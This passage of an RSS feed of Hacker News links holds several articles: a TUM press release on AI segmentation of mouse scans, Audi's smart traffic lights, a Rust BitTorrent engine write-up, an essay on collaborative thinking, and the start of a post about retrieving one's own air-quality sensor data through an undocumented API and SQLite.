cell. Biologists had also localized the organs in these datasets.</p></div></div></div><div id="c61472"><div><div><p>At the TranslaTUM the information techs presented the data to their new algorithms. And these learned faster than expected, Schoppe reports: "We only needed around ten whole-body scans before the software was able to successfully analyze the image data on its own – and within a matter of seconds. It takes a human hours to do this."</p><p>The team then checked the reliability of the artificial intelligence with the help of 200 further whole-body scans of mice. "The result shows that self-learning algorithms are not only faster at analyzing biological image data than humans, but also more accurate," sums up Professor Bjoern Menze, head of the Image-Based Biomedical Modeling group at TranslaTUM at the Technical University of Munich.</p><p>The intelligent software is to be used in the future in particular in basic research: "Images of mice are vital for, for example, investigating the effects of new medication before they are given to humans. Using self-learning algorithms to analyze image data in the future will save a lot of time in the future," emphasizes Menze.</p></div></div></div><div><h3>
			Publications:
		</h3><p>Oliver Schoppe, Chenchen Pan, Javier Coronel, Hongcheng Mai, Zhouyi Rong, Mihail Ivilinov Todorov, Annemarie Müskes, Fernando Navarro, Hongwei Li, Ali Ertürk, Bjoern H. Menze<br> Deep learning-enabled multi-organ segmentation in whole-body mouse scans<br> nature communications, 6.11.2020 – DOI: <a href="https://www.nature.com/articles/s41467-020-19449-7#Abs1" title="Link zur Originalpublikation" target="_blank">10.1038/s41467-020-19449-7</a></p></div><div><h3>
			More information:
		</h3><div><p>The research was conducted at <a href="https://www.translatum.tum.de/en/" title="Link to TranslaTUM website" target="_blank">TranslaTUM</a>, the Center for Translational Cancer Research, at the Technical University of Munich. The institute is part of the <a href="https://www.med.tum.de/en" title="Link to TUM School of Medicine" target="_blank">TUM University Hospital rechts der Isar</a> and specializes in transferring cancer research insights to practical patient services through interdisciplinary cooperation. When using the novel 3D microscopy, the scientists at the TUM worked closely with experts at the Helmholtz Zentrum München.</p><p>The research project was funded by the German Federal Ministry of Education and Research (BMBF) within the scope of the Software Campus Initiative, the Deutsche Forschungsgemeinschaft (DFG) via the cluster of excellence <a href="https://www.synergy-munich.de/" title="Link to cluster of excellence SyNergy" target="_blank">Munich Cluster for Systems Neurology (SyNergy)</a>, as well as a research grant and by the <a href="https://www.ias.tum.de/" title="Link to TUM Institute for Advanced Study" target="_blank">TUM Institute for Advanced Study</a> funded by the German excellence initiative and the European Union. The research was also funded by the Fritz Thyssen Foundation. NVIDIA supported the work of the GPU Grant Program.</p></div></div><div><div><div><h3>
		Corporate Communications Center
	</h3></div></div></div><section></section></section></article></div></div></div>]]>
            </description>
            <link>https://www.tum.de/nc/en/about-tum/news/press-releases/details/36399/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572558</guid>
            <pubDate>Tue, 29 Dec 2020 17:55:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Catching the ‘Green Wave’ – Audi Introduces Smart Traffic Lights in Düsseldorf]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25572490">thread link</a>) | @caminocorner
<br/>
December 29, 2020 | https://www.autofutures.tv/2020/01/28/audi-traffic-lights/ | <a href="https://web.archive.org/web/*/https://www.autofutures.tv/2020/01/28/audi-traffic-lights/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span><span> Reading Time: </span> <span>2</span> <span>minutes</span></span></p><p>Following successful trials in Ingolstadt, Audi is moving ahead with its smart networked traffic lights in Düsseldorf, which will become the second European city to be introduced to the German automaker’s Traffic Light Information service.</p><p>At the end of January, Audi drivers will see information from around 150 traffic lights in their cockpit, thus increasing their chance of catching a ‘green wave.’ By early summer most of the intersections in Düsseldorf, approximately 450 out of a total of some 600 installations, will be networked. Vehicle-to-infrastructure (V2I) services like Audi Traffic Light Information increase efficiency, convenience and safety on the roads.</p><p>Audi Traffic Light Information consists of two functions: Green Light Optimized Speed Advisory (GLOSA) and Time-to-Green. GLOSA calculates the ideal speed for getting a ‘green wave.’ For example, if the function indicates the applicable speed limit, the next traffic light will be reached at green. Drivers do not have to accelerate unnecessarily, they are not stressed, and they drive more safely. GLOSA can also suggest reducing speed gradually about 250 meters ahead of the traffic lights so that the driver and the cars behind reach the intersection when the lights turn to green. This reduces uneconomical stop-and-go traffic.</p><p>If stopping at a red light is unavoidable, a countdown displays the seconds remaining until the next green phase begins (Time-to-Green). Drivers can relax, take their foot off the gas pedal and save fuel. A number of studies conclude that drivers move through cities more efficiently thanks to networked traffic lights. In a pilot project, Audi was able to reduce fuel consumption by 15 percent.</p><p>“With Audi Traffic Light Information we wish to improve convenience for drivers, increase traffic safety and encourage an economical style of driving that looks ahead,” said Andre Hainzlmaier, head of development for Apps, Connected Services and Smart City at Audi.<br> “To do this, we have to predict precisely how traffic lights will behave in the next two minutes. At the same time, exact forecasts are the biggest challenge. Most signals react variably to traffic volume and continuously adapt the intervals at which they switch between red and green.”</p><p>In the future, cities will receive useful information about their traffic light infrastructure. The data show, for example, whether cars stop unusually often at a particular intersection or whether the average waiting time is comparatively long.</p><p>“We aggregate the recorded data into reports that we will make available to the city authorities. Traffic lights can then be given more efficient phasing and traffic will flow better,” adds Hainzlmaier.</p><p>Audi Traffic Light Information premiered in 2016 in Las Vegas. Today this V2I service is available at more than 10,000 intersections in North America, including some 2,000 in Manhattan/New York City and more than 1,600 around the US capital Washington D.C. Audi is also the world’s first automotive manufacturer to network its series-production models with city traffic lights.</p></div></div>]]>
            </description>
            <link>https://www.autofutures.tv/2020/01/28/audi-traffic-lights/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572490</guid>
            <pubDate>Tue, 29 Dec 2020 17:50:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing a BitTorrent engine in Rust]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25572039">thread link</a>) | @mandreyel
<br/>
December 29, 2020 | https://mandreyel.github.io/posts/rust-bittorrent-engine/ | <a href="https://web.archive.org/web/*/https://mandreyel.github.io/posts/rust-bittorrent-engine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>This post recounts the journey of writing
<a href="https://github.com/mandreyel/cratetorrent">cratetorrent</a>, interesting
optimizations, and some of the insights gained.</p>
<h2 id="prologue">Prologue</h2>
<p>Growing up, torrenting was a big thing around me. I was always curious how it
worked.</p>
<p>This curiosity only grew after I had gotten into programming and understood more
details. There is a piece of technology that is so effective yet simple, that,
without any marketing, it gained widespread adoption due to sheer technical
superiority. It just worked and people used it.</p>
<p>So why not write one? I tried, in C++. It was never finished and it’s probably
better that way. Let’s forget it.</p>
<p>Fast-forward a few years. I got into Rust and needed a familiar playground to
practice the language. I did what anyone in such a situation would do: I wrote
another torrent engine. It’s torrent engines all the way back.</p>
<p>Thus was cratetorrent born. The name is a wordplay on the C++
<a href="https://github.com/arvidn/libtorrent"><code>libtorrent</code> library</a>. Its code and
blog were highly educational during my first attempt. This is my thanks.</p>
<h2 id="torrent-101">Torrent 101</h2>
<p>So how <em>do</em> torrents work?</p>
<p>A brief overview of the BitTorrent V1
protocol follows. For those familiar, feel free to skip to the <a href="#key-optimizations">next
section</a>.</p>
<h3 id="what-is-it">What is it?</h3>
<p>BitTorrent is a <em>mostly</em> decentralized file-sharing protocol: it consists of
potentially many symmetrical clients exchanging arbitrary data.</p>
<p>Its advantage over downloading from a single host is that the load is
distributed among all participants in the torrent, thereby increasing
availability, scalability, and often download speed, too.</p>
<p>It used to be highly popular, as everyone used it to share…Linux distros, yes,
and other <em>definitely legal content</em>. Nowadays it’s still in use, but its
use cases are more subtle: e.g. Windows 10 uses BitTorrent, or something like
it, to <a href="https://lifehacker.com/windows-10-uses-your-bandwidth-to-distribute-updates-d-1721091469">distribute
updates</a>
among its users.</p>
<h3 id="whos-in-a-torrent">Who’s in a torrent?</h3>
<p>The first actor on the stage is the torrent <em>metainfo</em> file. It contains basic
metadata about the torrent, most importantly its name, its files with their
paths and lengths, and its <em>trackers</em>. These files are usually hosted by
torrenting sites and this is what you download when starting a torrent.</p>
<p>So what are these trackers? While the download of the content itself is fully
decentralized, a client needs to know which other clients it can download from.
Such other clients in the torrent’s <em>swarm</em> are called <em>peers</em>. Peers that have
all the data are <em>seeds</em>, the rest are <em>leeches</em>. A bit of an uncomfortable
term.</p>
<p>Therefore at the beginning of a download a client asks trackers about
peers. Trackers are the only centralized part of the protocol.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> Once done,
the client connects these peers and begins downloading data.</p>
<h3 id="data-representation">Data representation</h3>
<p>A torrent may have one or more files but from the point of view of the wire
protocol they are all just one big contiguous sequence of bytes.</p>
<p>This byte sequence is cut up into equal sized <em>pieces</em>, which are further cut up
into 16 KiB <em>blocks</em>. Peers exchange these blocks of data and use them to
reassemble the torrent’s files.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p>
<p>A peer can only share the complete pieces it has. However, breaking up a piece
into blocks enables downloading it from multiple peers, potentially
completing it sooner. Once complete, the peer can immediately share it with
other peers, even if it does not have all pieces itself. This increases
availability, a key feature of the protocol.</p>
<p>A tricky part here is that files are not padded to align with piece boundaries.</p>
<figure>
  <img src="https://mandreyel.github.io/images/cratetorrent-data-repr.svg" alt="data representation">
</figure>



<p>This has two consequences:</p>
<ul>
<li>the last piece may be smaller than the rest,</li>
<li>and pieces may not align with file boundaries, both shown above.</li>
</ul>
<p>Therefore when writing blocks to disk, they may have to be split across several
files. The logic can get quite gnarly here if done optimally.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></p>
<h3 id="the-peer-protocol">The peer protocol</h3>
<ul>
<li>After the client connected the peer via TCP, they exchange handshakes.</li>
<li>One or both tells the other that it can start requesting blocks.</li>
<li>The client then requests a block from a piece it chose<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>, its peer sends it,
and the client saves it.</li>
<li>Repeat until finished.</li>
</ul>
<p>That’s about it, but perhaps surprising no one, a real world implementation will
be quite a bit more complex. Let’s see some of the complications.</p>
<h2 id="key-optimizations">Key optimizations</h2>
<p>(But nothing premature, promise!)</p>
<h3 id="download-pipelining">Download pipelining</h3>
<p>A naive implementation might do what was outlined above: send requests
sequentially, one after the previous request was served. The problem with it is
that it doesn’t utilize the connection’s capacity.</p>
<p>To do so, we try to estimate a connection’s <a href="https://en.wikipedia.org/wiki/Bandwidth-delay_product">bandwidth-delay
product</a> for each peer
that the client is downloading from. This is the maximum amount of data that can
be on the link at any given time–that is, the sent but not yet received bytes.</p>
<p>So to get the best performance we keep as many requests outstanding as would
fill the link’s capacity.</p>
<p>A picture makes this explanation a lot more pleasant:</p>
<figure>
  <img src="https://mandreyel.github.io/images/cratetorrent-request-pipeline.svg" alt="download pipelining benefits">
</figure>



<p>It’s clearly visible that in the same amount of time, a lot more requests could
be fulfilled. This is the number one most important optimization, strongly
recommended by the spec itself.</p>
<p>Cratetorrent uses a running average for the download rate and a simplified model
of the BDP, by assuming the latency to be a constant 1 second, to get the
request queue size:</p>
<div><pre><code data-lang="rust"><span>let</span> request_queue_size <span>=</span> download_rate <span>/</span> BLOCK_LEN;
</code></pre></div><p>The 1 second value was chosen for simplicity, but it’s a reasonable guess if we
take the link to mean the full request round-trip from one peer’s disk to that
of another.</p>
<h3 id="slow-start">Slow start</h3>
<p>The above suggests an interesting problem: what’s the fastest way of
arriving at the link’s capacity? Taking time to get to this optimum number costs
time. No good.</p>
<p>It turns out that this is a solved problem. To find the answer we just have
to peek one layer below in the network stack: <strong>TCP</strong>.</p>
<p>When a TCP connection is set up, the protocol tries to find the right congestion
window size. This is a fancy way of saying “the number of bytes to send that
doesn’t choke the remote host and everything else in between but still makes use
of the network capacity.” Our purposes are similar.</p>
<p>This is roughly what TCP does:</p>
<ol>
<li>At the start of the connection, set the congestion window size to some
constant.</li>
<li>Send an equivalent number of segments to peer.</li>
<li>For each ACK (acknowledgement message) received, increase the window size by
1.</li>
</ol>
<p>Each time all ACKs are received for a volley of segments, the window size
doubles. This growth is exponential, yet the algorithm is confusingly called
<a href="https://en.wikipedia.org/wiki/TCP_congestion_control#Slow_start">slow start</a>
(presumably named after the thing it tries to avoid).</p>
<p>TCP stops growing the window when the first timed out or dropped segment is
detected. This would be difficult to replicate in user-space, so cratetorrent
instead increases the request queue size every time a block is received, and
<a href="https://github.com/mandreyel/cratetorrent/blob/master/cratetorrent/src/peer/state.rs#L300-L316">stops</a>
when the download rate isn’t increasing much anymore.<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup></p>
<figure>
  <img src="https://mandreyel.github.io/images/cratetorrent-slow-start.svg" alt="download pipelining benefits">
</figure>



<p>With each served request, more requests are sent, and the connection is getting
closer to fully using the available bandwidth (the non-blue area is shrinking).</p>
<h3 id="endgame-mode">Endgame mode</h3>
<p>I noticed that sometimes the last phase of a download gets stagnant, barely
progressing from one block to the next.</p>
<p>This happens when the last pending pieces are downloaded from slow peers, which
can delay the completion of a download by a surprising amount.<sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup></p>
<p>Similarly, this issue is also solved–mentioned in the spec, in fact:</p>
<p>While normally each block is requested from a single peer, blocks in the last
pending pieces should be downloaded from all peers, on a “whoever sends it
first” basis. Once they arrive, requests to the slower peers are simply
cancelled. This wastes some bandwidth but saves quite a bit of time.</p>
<hr>
<p>These were the most significant design choices in terms of how they affected
performance. There are a few more but neither you or I have forever. So let’s
move on and see how all this translates into Rust.</p>
<h2 id="architecture">Architecture</h2>
<p>Cratetorrent employs asynchronous IO on the network side, and a thread-pool
backed blocking IO on the disk side. It uses
<a href="https://github.com/tokio-rs/tokio">Tokio</a> for both, the de facto async IO
runtime in Rust.</p>
<p>The engine’s main components are:</p>
<ul>
<li>The <strong>engine</strong> itself, which manages torrents and executes the library user’s
commands.</li>
<li>One or more <strong>torrents</strong>, each corresponding to a single torrent
upload/download. They manage their peers and trackers.</li>
<li>Torrents have an arbitrary number of <strong>peer sessions</strong>, which represent
connections with peers from start to finish. This entity implements the
BitTorrent wire protocol and is as such on the lowest layer.</li>
<li><strong>Disk IO</strong> is handled by an entity of its own, for clarity and separation of
concerns.</li>
</ul>
<p>All of these are separate <a href="https://docs.rs/tokio/0.2.13/tokio/task">tasks</a>
(essentially application level <a href="https://en.wikipedia.org/wiki/Green_threads">green
threads</a>). Because tasks are
as good as separate threads from the point of view of the borrow-checker, shared
access is not permitted without synchronization. There are two ways to do that.</p>
<h3 id="task-event-loop">Task event loop</h3>
<p>Control flow between tasks is primarily implemented via asynchronous <a href="https://en.wikipedia.org/wiki/Message_passing"><em>message
passing</em></a>, using
multiple-producer single-consumer
<a href="https://tokio.rs/tokio/tutorial/channels"><em>channels</em></a>. Each task is
reactive: it has an <em>event loop</em> and it reacts to internal events and messages
from other tasks.</p>
<p>Torrents and peer sessions perform a periodic “tick” (like the tick of a clock),
once a second currently, to update their internal state and broadcast messages.
This is when alerts (such as periodic download statistics or “download
complete”) are sent to the library user for example.<sup id="fnref:7"><a href="#fn:7" role="doc-noteref">7</a></sup></p>
<p>A torrent’s event loop might look like this:</p>
<div><pre><code data-lang="rust"><span>loop</span> {
    select<span>!</span> {
        <span>// periodic tick
</span><span></span>        _ <span>=</span> tick_timer.select_next_some() <span>=&gt;</span> {
            self.tick().<span>await</span><span>?</span>;
        }
        <span>// peers wanting to connect
</span><span></span>        peer_conn_result <span>=</span> incoming.select_next_some() <span>=&gt;</span> {
            <span>if</span> <span>let</span> Ok(socket) <span>=</span> peer_conn_result {
                self.handle_incoming_peer(socket)<span>?</span>;
            }
        }
        <span>// commands from other parts of the engine
</span><span></span>        cmd <span>=</span> self.cmd_rx.select_next_some() <span>=&gt;</span> {
            self.handle_cmd(cmd).<span>await</span><span>?</span>;
        }
    }
}
</code></pre></div><p>(<code>select!</code> is a macro that waits on all streams and returns the item produced by
the first ready stream. And streams are just types that eventually produce a
<em>stream</em> of values over time.)</p>
<p>Another component in the engine might …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mandreyel.github.io/posts/rust-bittorrent-engine/">https://mandreyel.github.io/posts/rust-bittorrent-engine/</a></em></p>]]>
            </description>
            <link>https://mandreyel.github.io/posts/rust-bittorrent-engine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572039</guid>
            <pubDate>Tue, 29 Dec 2020 17:14:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Collaborative Thinking]]>
            </title>
            <description>
<![CDATA[
Score 33 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25572029">thread link</a>) | @jackyzhao
<br/>
December 29, 2020 | https://blog.jzhao.xyz/posts/collaborative-thinking/ | <a href="https://web.archive.org/web/*/https://blog.jzhao.xyz/posts/collaborative-thinking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="postTitle"><p>written December 28, 2020 // 1246 words</p></div><div id="mainText"><p>Recently, I’ve been reading <strong>21 Lessons for the 21st Century</strong> written by none other than Yuval Noah Harari, and have been enjoying the book. Its approach to weaving together insights from a vast number of disciplines to create something novel is extremely refreshing. I just read a section on learning, the knowledge illusion, and collaborative thinking and wanted to share some of my thoughts that have been bouncing around and marinating for a few days as well as some learnings that I’ve applied to my own life.</p><h2 id="collaborative-thinking">Collaborative Thinking</h2><blockquote><p>Humans rarely think for themselves. Rather, we think in groups. Just as it takes a tribe to raise a child, it also takes a tribe to invent a tool, solve a conflict, or cure a disease. No individual knows everything it takes to build a cathedral, an atom bomb, or an aircraft.</p></blockquote><p>It is no secret that the key to the rise of <em>Homo Sapiens</em> and the anthropocene wasn’t due to the rationality of any individual human, but rather our collective unparalleled ability to think and share knowledge in large groups. This concept has arisen in the form of <em>specialization of labour</em>.</p><p>As a society, we consistently rely on the knowledge of others to live our own comfortable lives. I may not know how to grow my very own russet potatoes, but a farmer in Alberta might. Similarly, a plumber in Massachusetts may not know how to build their own website, but I might. Through being able to supplement each other’s knowledge of the world, our <em>collective</em> knowledge is much greater.</p><p><img src="https://blog.jzhao.xyz/img/knowledge.png" alt="Left: Collective knowledge of the group. Right: My subset of knowledge"><em>Left: Collective knowledge of the group. Right: My subset of knowledge</em></p><p>I like to think about collective knowledge as a big blob. Each individual contributes a unique <em>subset</em> of knowledge. We get the entirety of human knowledge by taking the <em>union of the knowledge</em> of all the individuals in the group. Of course, as these groups of individuals grow ever larger due to globalization, each individual may choose to specialize in a narrower subset of knowledge as generations go on to reduce redundancy. Why know how to build your own car when you can buy it yourself? The adoption of globally accepted currencies has made this easier than ever.</p><h2 id="knowledge-illusion">Knowledge illusion</h2><p>Humans also have this ‘knowledge illusion’ where we think we know a lot, even though individually we know very little. We treat the knowledge of the human collective as if it were our own, even subconsciously.</p><p><img src="https://blog.jzhao.xyz/img/zipper.png" alt="A crude illustration of a jacket zipper"><em>A crude illustration of a jacket zipper</em></p><p>An example Harari used was the sweater zipper. If I were to ask you if you knew how a zipper works, the vast majority of you would exclaim “yes, of course!” Yet, if asked to describe in <em>detail</em> every single step, most would fail to do so. Even with something that seems so basic and intuitive seems to elude an explicit explanation. We have begun to stand on the shoulders of giants yet refuse to acknowledge their presence.</p><p>Although we may have increased the overall area of our collective knowledge, the surface area of each individual has also shrunken, turning from balanced and broad to narrow and unwieldy.</p><h2 id="rebalancing-our-blob-of-knowledge">Rebalancing our blob of knowledge</h2><p>Another interesting property about the knowledge blobs of individuals is that they are <em>magnetic</em>. I mean this in the sense that individuals that have one blob of knowledge tend to attract and be attracted to individuals with similar orientations and shapes in their blobs of knowledge, much like how magnetic dipoles align in a magnet. As humans, we tend to want to minimize our cognitive dissonance and surrounding ourselves with like-minded individuals is the easiest way to do that.</p><p>Individuals in these clusters experience a sort of echo chamber effect whereby the <em>magnitude</em> of their knowledge is amplified through the mutual alignment of their knowledge. However, this also poses a unique challenge where movement only happens in one direction and there is little to no room to deviate from that direction and try something new; something incredibly dangerous for innovation. This, in a sense, is turning collaborative thinking into groupthink.</p><blockquote><p>People afraid of losing their truth tend to be more violent than people who are used to looking at the world from several different viewpoints.</p></blockquote><p><img src="https://blog.jzhao.xyz/img/spikes.png" alt="Broadening our base fundamental knowledge. Blue: Previous ‘specialized’ knowledge. Purple: broad foundational knowledge"><em>Blue: Previous ‘specialized’ knowledge. Purple: broad foundational knowledge</em></p><p>What we can do to counteract this extreme alignment is to build a broader foundation of knowledge. When you come across an individual with differing views, hopefully you will at least have the base fundamental knowledge to understand their perspective.</p><h2 id="learning-communities">Learning communities</h2><p>This, at least in part, is why I’ve recently become more certain of wanting to go to grad school in the future. I used to have tunnel-vision in thinking that all I wanted to do in the future was to just work in industry CS. Recently, I’ve started to realize that CS not a single discipline, but rather it’s a tool that can help solve uniquely human problems, and these human problems are inherently multidisciplinary.</p><p>I’ve started to read and learn more about the world around me outside of my little bubble of CS-related topics and it’s been eye-opening to see issues I read about in my philosophy class come up in a linguistics lecture which in turn comes up in a book I’m reading. I’ve found that the best way for me to cement my learning and understanding is through discussion with people, rather than just sitting and ruminating on my own – a very different pace than the typical <em>code-Stackoverflow-copy-repeat</em> self-learning cycle that most programmers (including myself) are familiar with.</p><p>The important part of learning communities like colleges is not necessarily the alignment in what you’re studying, but rather in the shared mindset of discussion, learning, and understanding. To broaden my foundation of knowledge is to read more about the opinions and findings of others and to critically discuss these among peers who may have different views. If we want our specialized knowledge to be applicable in a wide range of situations, we need a broad foundational base that can support that.</p><h2 id="wiggle-room">Wiggle room</h2><blockquote><p>If you want to go deeply into any subject, you need a lot of time, and in particular, you need the privilege of wasting time. You need to experiment with unproductive paths, explore dead ends, make space for doubts and boredom, and allow little seeds of insight to slowly grow and blossom</p></blockquote><p>For me, learning is very close to a zero-sum game. I can only expand the area of my knowledge blob so fast. If I want to broaden my foundational knowledge base, I need to reign in the amount of time spent growing purely technical strengths and to stop saying ‘yes’ to any and every opportunity that comes up.</p><p>Slowly but surely, I’m learning to value my own time and to set it aside to just absorb more about the world and to extend the reaches of my knowledge just a little bit further. To dilly-dally among the Wikipedia rabbit holes and faff among the ridiculously long list of side projects I planned to start. I’m experimenting with what I previously thought were deadends and little seeds of insight are starting to grow. Maybe I’ll find something interesting to share among the construction of this broader foundation.</p><p><strong>Acknowledgements</strong></p><p>A big thank yu to <a href="https://twitter.com/ansonyuu">Anson</a> for always being a sounding board for fresh dough (half-baked ideas would be too generous of a description for these). Thanks to <a href="https://www.linkedin.com/in/anneguo3/">Anne</a> and <a href="https://twitter.com/y1huen">Joice</a> for also giving feedback on rough drafts :))</p></div></div>]]>
            </description>
            <link>https://blog.jzhao.xyz/posts/collaborative-thinking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572029</guid>
            <pubDate>Tue, 29 Dec 2020 17:14:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I unlocked my own air quality sensor data with undocumented APIs and SQLite]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25571580">thread link</a>) | @dend
<br/>
December 29, 2020 | https://den.dev/blog/air/ | <a href="https://web.archive.org/web/*/https://den.dev/blog/air/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <section>
    <article>
      <header>
        
        <h4>I learned that owning your data is powerful, and it's even more powerful when you are able to slice-and-dice it for better insights.</h4>
        <p>By Den Delimarsky in <a href="https://den.dev/categories/hackery">Hackery</a> </p>
        <p>December 28, 2020</p>
      </header>
      <section>
        <p>I am naturally curious about the APIs<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> that the devices in my house use, so when I got an air quality monitor, one of the first things I did was fiddle with the REST APIs that were made available through the device. As it turns out - more than I expected. In this post, I will discuss the use of an undocumented API, so no warranties are implied - it might stop working tomorrow for all I know.</p>
<h2 id="contents">Contents</h2>
<ul>
<li><a href="#overview">Overview</a></li>
<li><a href="#getting-data-through-app-apis">Getting data through app APIs</a></li>
<li><a href="#building-out-custom-analysis">Building out custom analysis</a></li>
<li><a href="#discovering-the-web-apis">Discovering the web APIs</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>
<h2 id="overview">Overview</h2>
<p>Let’s get started by taking a look at <em>what</em> device I have, exactly. It’s an IQAir AirVisual Pro<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> - a bit on the pricey side, but it gets the job done and has all the data that I need, like CO2 concentration, current AQI<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>, temperature, humidity, and PM2.5 concentration.</p>
<p><img src="https://cdn.den.dev/images/postmedia/air/airvisual-pro.png" alt="AirVisual Pro air quality monitor"></p>
<p>Neat little device, but the application that it comes with, along with the web experience is a bit underwhelming. Mostly because it only shows data for a short period of time, and doesn’t allow any kinds of pivots or transformations, which can be a bit boring. Say I want to know at what hours I have the highest CO2 concentration inside the house, or compare the humidity over time - none of this is an option with the default app <em>or</em> the online service.</p>
<p>If I wanted to go the easiest route, I could explore some of the built-in functionality. The device exposes a SMB share for the data that you can grab if you are on the local network, but that means that I need to boot device off of my guest network and onto my main one, which I don’t want to do. So what’s an engineer to do? Man-in-the-middle the app<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup> to figure out what servers it talks to, because I just <em>assumed</em> that the data is not only stored locally (there is a joke about Internet of Things here somewhere<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup>).</p>
<h2 id="getting-data-through-app-apis">Getting data through app APIs</h2>
<p>The folks at IQAir seem to have created several branches for their API, and at least two are known to me - the one for the app, and the one for the web interface. By looking at the traffic that originated from my mobile device, I realized that there is an endpoint that can actually channel all the info in one call - all I needed to do was send requests to the following URL:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span></code></pre></td>
<td>
<pre><code data-lang="http"><span>https://app-api.airvisual.com/api/v5/devices/{device_id}/measurements
</span></code></pre></td></tr></tbody></table>
</div>
</div><p>The device ID is something you can grab from the device itself or through the app.</p>
<p>Because with <code>mitmproxy</code> I can also inspect the headers, it was relatively easy to spot that there is a pre-baked <code>x-api-token</code> header that I could grab directly from the app. That is, if I just want to grab the data - but what if the token expires? Is there a way to get a new one? Well, as it turns out, the token is hard-coded into the application (or so it seems), which makes my job that much easier - this means I can just run all the requests I need directly. By using the aforementioned header, I am able to get a JSON representation of the data that originated from my device, along with the comparison information for the location I set the air quality sensor to use as the baseline.</p>
<p><img src="https://cdn.den.dev/images/postmedia/air/example-body-json.png" alt="Example of JSON payload returned by the IQAir API"></p>
<p>Great, so I am mostly where I want to be. I now can access the data, and ideally store it locally. By accessing the data directly from the service, I can now write a <code>cron</code> job that can take regular snapshots of the environment and place those somewhere. What is somewhere, though?</p>
<p>There could be many choices, including writing everything to a CSV file or maybe even to a document database, if I would need to access the information remotely. For now, however, I just needed to run local analysis, so I opted for SQLite. By using SQLite, I am able to create SQL queries on the data, and slice-and-dice it in a way that makes the most sense for scenarios that I care about right now, or might care about in the future. I could create a very simple table with the help of this SQL snippet:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span><span>19
</span><span>20
</span><span>21
</span><span>22
</span><span>23
</span></code></pre></td>
<td>
<pre><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> <span>"AirQualityData"</span> (
	<span>"Timestamp"</span>	<span>TEXT</span>,
	<span>"IndoorTemperature"</span>	<span>REAL</span>,
	<span>"IndoorHumidity"</span>	<span>REAL</span>,
	<span>"OutdoorTemperature"</span>	<span>REAL</span>,
	<span>"OutdoorPressure"</span>	<span>REAL</span>,
	<span>"OutdoorHumidity"</span>	<span>REAL</span>,
	<span>"OutdoorWindSpeed"</span>	<span>REAL</span>,
	<span>"OutdoorWindDirection"</span>	<span>REAL</span>,
	<span>"OutdoorWeatherIcon"</span>	<span>TEXT</span>,
	<span>"IndoorPM25AQI"</span>	<span>REAL</span>,
	<span>"IndoorPM25Concentration"</span>	<span>REAL</span>,
	<span>"IndoorCO2Color"</span>	<span>TEXT</span>,
	<span>"IndoorCO2Concentration"</span>	<span>REAL</span>,
	<span>"IndoorPM10AQI"</span>	<span>REAL</span>,
	<span>"IndoorPM10Concentration"</span>	<span>REAL</span>,
	<span>"IndoorPM1AQI"</span>	<span>REAL</span>,
	<span>"IndoorPM1Concentration"</span>	<span>REAL</span>,
	<span>"OutdoorAQI"</span>	<span>REAL</span>,
	<span>"OutdoorPollutant"</span>	<span>TEXT</span>,
	<span>"OutdoorConcentration"</span>	<span>REAL</span>,
	<span>PRIMARY</span> <span>KEY</span>(<span>"Timestamp"</span>)
);
</code></pre></td></tr></tbody></table>
</div>
</div><p>I could already hear someone being utterly horrified by the fact that I chose the timestamp as the primary key, but worry not - this decision was made based on the fact that the environment data is captured on an hourly basis. What that means is that every entry should <em>technically</em> be unique, and if a new or updated entry is added with the same timestamp, it should just overwrite whatever is already in the database.</p>
<p>The function to store data in this table (written in Python) then becomes very easy because I just need to run a <code>INSERT OR REPLACE</code> statement:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span></code></pre></td>
<td>
<pre><code data-lang="python"><span>def</span> <span>StoreMeasurements</span>(database_name, measurements):
	data_connection <span>=</span> sqlite3<span>.</span>connect(database_name)

